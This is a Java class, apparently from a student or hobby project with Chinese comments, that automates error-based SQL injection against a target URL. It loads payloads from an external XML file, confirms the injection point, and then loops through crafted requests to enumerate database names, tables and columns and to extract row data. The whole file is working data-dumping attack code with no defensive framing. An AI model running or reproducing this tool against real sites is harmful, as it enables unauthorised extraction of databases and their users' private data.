package com.pagen.examination.InjectTest;

import com.pagen.examination.InjectTest.Driver.BaseDriver;
import com.pagen.examination.InjectTest.Driver.Boundaries;
import com.pagen.examination.InjectTest.Driver.ErrorBaseDriver;
import com.pagen.examination.URL_Pages_Translation;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 * 报错注入实现类
 */
public class ErrorBasedTest {
    private List<ErrorBaseDriver> errorBasedCheck;
    private List<ErrorBaseDriver> sqlNameInject;
    private List<ErrorBaseDriver> tableNameInject;
    private List<ErrorBaseDriver> columnNameInject;
    private List<ErrorBaseDriver> dataInject;
    private BaseOperation opera;
    private URL_Pages_Translation page;
    private Boundaries boundaries;

    /**
     * 构造方法
     *
     * @param page：原始页面
     */
    public ErrorBasedTest(URL_Pages_Translation page, Boundaries boundaries) {
        try {
            UploadPayload1();
            this.page = page;
            opera = new BaseOperation();
            this.boundaries = boundaries;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 加载测试用例
     */
    private void UploadPayload1() throws ParserConfigurationException, SAXException, IOException {
        //1、获取解析工厂   SAXParserFactory是protect类型，所以用他的静态方法
        SAXParserFactory factory = SAXParserFactory.newInstance();
        //2、从解析工厂获取解析器
        SAXParser parse = factory.newSAXParser();
        //3、加载文档 Document 注册处理器
        //4、编写处理器
        readDriver handler = new readDriver();
        handler.setClassName("ErrorBaseDriver");
        parse.parse("src/xinan/sql/InjectTest/xml/error_base.xml", handler);

        List<BaseDriver> base = handler.getPayloads();     //得到一个List对象，里面包含两个Persond类型的对象<person1,person2>
        errorBasedCheck = new ArrayList<>();
        sqlNameInject = new ArrayList<>();
        tableNameInject = new ArrayList<>();
        columnNameInject = new ArrayList<>();
        dataInject = new ArrayList<>();
        for (BaseDriver b : base) {
            ErrorBaseDriver ub = (ErrorBaseDriver) b;
            switch (ub.getTitle()) {
                case "ERROR BASE CHECK":
                    errorBasedCheck.add(ub);
                    break;
                case "INJECT SQL NAME":
                    sqlNameInject.add(ub);
                    break;
                case "INJECT TABLE NAME":
                    tableNameInject.add(ub);
                    break;
                case "INJECT COLUMN NAME":
                    columnNameInject.add(ub);
                    break;
                case "INJECT DATA":
                    dataInject.add(ub);
                    break;
            }
        }
    }

    /**
     * 运行测试用例，检测 SQL 注入中 URL 的边界信息，判断是什么类型的注入
     *
     * @return 边界
     */
    public ErrorBaseDriver runTestPayload() throws IOException {
        String originUrl = page.getUrl().toString();
        for (ErrorBaseDriver driver : errorBasedCheck) {
            String temp = driver.getPayload();
            temp = temp.replaceAll(" ", "%20");

            String ebUrl = originUrl + boundaries.getPrefix() + temp + boundaries.getSuffix();
            System.out.println(temp);

            page.setPageInfo(new URL(ebUrl));
            String sqlPage = page.getPageInfo();

            int startIndex = sqlPage.indexOf("!//!");
            int endIndex = sqlPage.indexOf(">>");

            if (startIndex > -1 && startIndex < endIndex) {             //有出现"/"符号
                System.out.println("是报错注入");
                ebUrl = ebUrl.replaceAll("(select%20database[()][()])", "PAYLOAD");
                driver.SetAttr("payload", ebUrl);
                return driver;                  // 说明是报错注入
            }
        }
        return null;
    }


    /**
     * 获取所有数据库名
     *
     * @param driver ：驱动
     * @return ：数据库名列表
     */
    public List<String> getSQLsName(ErrorBaseDriver driver) {
        List<String> sqlname = new ArrayList<>();
        if (sqlNameInject == null || driver.getPayload() == null) {
            return null;
        }
        for (ErrorBaseDriver payload : sqlNameInject) {
            int index = 0;
            while (true) {
                try {
                    String temp = payload.getPayload();
                    temp = temp.replaceAll("(RANDNUM1)", String.valueOf(index));
                    temp = temp.replaceAll("(RANDNUM2)", "1");
                    temp = temp.replaceAll(" ", "%20");
                    String url = driver.getPayload().replaceAll("(PAYLOAD)", temp);

                    page.setPageInfo(new URL(url));
                    String sqlPage = page.getPageInfo();

                    int startIndex = sqlPage.indexOf("!//!");
                    int endIndex = sqlPage.indexOf(">>");
                    if (startIndex > -1 && endIndex > startIndex) {            //有出现"/"符号
                        sqlname.add(sqlPage.substring(startIndex + 4, endIndex));
                        index++;
                        continue;
                    } else if (index > 0) {
                        return sqlname;
                    }
                    break;
                } catch (Exception ignored) {
                }
            }
        }
        return null;
    }

    /**
     * 获取指定数据库的所有表名
     *
     * @param driver  ： 驱动
     * @param sqlName ： 指定数据库名
     * @return ：表名列表
     */
    public List<String> getTableName(ErrorBaseDriver driver, String sqlName) {
        List<String> tableName = new ArrayList<>();
        if (tableNameInject == null || driver.getPayload() == null) {
            return null;
        }
        for (ErrorBaseDriver payload : tableNameInject) {
            int index = 0;
            while (true) {
                try {
                    String temp = payload.getPayload();
                    temp = temp.replaceAll("(SQLNAME)", sqlName);
                    temp = temp.replaceAll("(RANDNUM1)", String.valueOf(index));
                    temp = temp.replaceAll("(RANDNUM2)", "1");
                    temp = temp.replaceAll(" ", "%20");
                    String url = driver.getPayload().replaceAll("(PAYLOAD)", temp);

                    System.out.println(url);
                    page.setPageInfo(new URL(url));
                    String sqlPage = page.getPageInfo();

                    int startIndex = sqlPage.indexOf("!//!");
                    int endIndex = sqlPage.indexOf(">>");
                    if (startIndex > -1 && startIndex < endIndex) {//有出现"/"符号
                        tableName.add(sqlPage.substring(startIndex + 4, endIndex));
                        index++;
                        continue;
                    } else if (index > 0) {
                        return tableName;
                    }
                    break;
                } catch (Exception ignored) {
                }
            }
        }
        return null;
    }

    /**
     * 获取指定数据库，指定表的所有列名
     *
     * @param driver  ： 驱动
     * @param sqlName ： 指定数据库名
     * @return ：表名列表
     */
    public List<String> getColumnName(ErrorBaseDriver driver, String sqlName, String tableName) {
        List<String> columnName = new ArrayList<>();
        if (columnNameInject == null || driver.getPayload() == null) {
            return null;
        }
        for (ErrorBaseDriver payload : columnNameInject) {
            int index = 0;
            while (true) {
                try {
                    String temp = payload.getPayload();
                    temp = temp.replaceAll("(SQLNAME)", sqlName);
                    temp = temp.replaceAll("(TABLENAME)", tableName);
                    temp = temp.replaceAll("(RANDNUM1)", String.valueOf(index));
                    temp = temp.replaceAll("(RANDNUM2)", "1");
                    temp = temp.replaceAll(" ", "%20");
                    String url = driver.getPayload().replaceAll("(PAYLOAD)", temp);

                    System.out.println(url);
                    page.setPageInfo(new URL(url));
                    String sqlPage = page.getPageInfo();

                    int startIndex = sqlPage.indexOf("!//!");
                    int endIndex = sqlPage.indexOf(">>");
                    if (startIndex > -1 && startIndex < endIndex) {//有出现"/"符号
                        columnName.add(sqlPage.substring(startIndex + 4, endIndex));
                        index++;
                        continue;
                    } else if (index > 0) {
                        return columnName;
                    }

                    break;

                } catch (Exception ignored) {
                }
            }
        }
        return null;
    }

    /**
     * 获取指定 数据库名、表名、列名 的数据
     *
     * @param driver      ： 驱动
     * @param sqlName     ： 指定数据库名
     * @param tableName   ： 指定表名
     * @param columnsName ： 指定列名
     * @return ： 数据列表
     */
    public List<String> getData(ErrorBaseDriver driver, String sqlName, String tableName, String columnsName) {
        List<String> data = new ArrayList<>();
        if (dataInject == null || driver.getPayload() == null) {
            return null;
        }
        for (ErrorBaseDriver payload : dataInject) {
            int index = 0;
            while (true) {
                try {
                    String temp = payload.getPayload();
                    temp = temp.replaceAll("(SQLNAME)", sqlName);
                    temp = temp.replaceAll("(TABLENAME)", tableName);
                    temp = temp.replaceAll("(COLUMNNAME)", columnsName);
                    temp = temp.replaceAll("(RANDNUM1)", String.valueOf(index));
                    temp = temp.replaceAll("(RANDNUM2)", "1");
                    temp = temp.replaceAll(" ", "%20");
                    String url = driver.getPayload().replaceAll("(PAYLOAD)", temp);

                    System.out.println(url);
                    page.setPageInfo(new URL(url));
                    String sqlPage = page.getPageInfo();

                    int startIndex = sqlPage.indexOf("!//!");
                    int endIndex = sqlPage.indexOf(">>");
                    if (startIndex > -1 && startIndex < endIndex) {//有出现"/"符号
                        data.add(sqlPage.substring(startIndex + 4, endIndex));
                        index++;
                        continue;
                    } else if (index > 0) {
                        return data;
                    }
                    break;
                } catch (Exception ignored) {
                }
            }
        }
        return null;
    }

    public void setPage(URL_Pages_Translation page) {
        this.page = page;
    }
}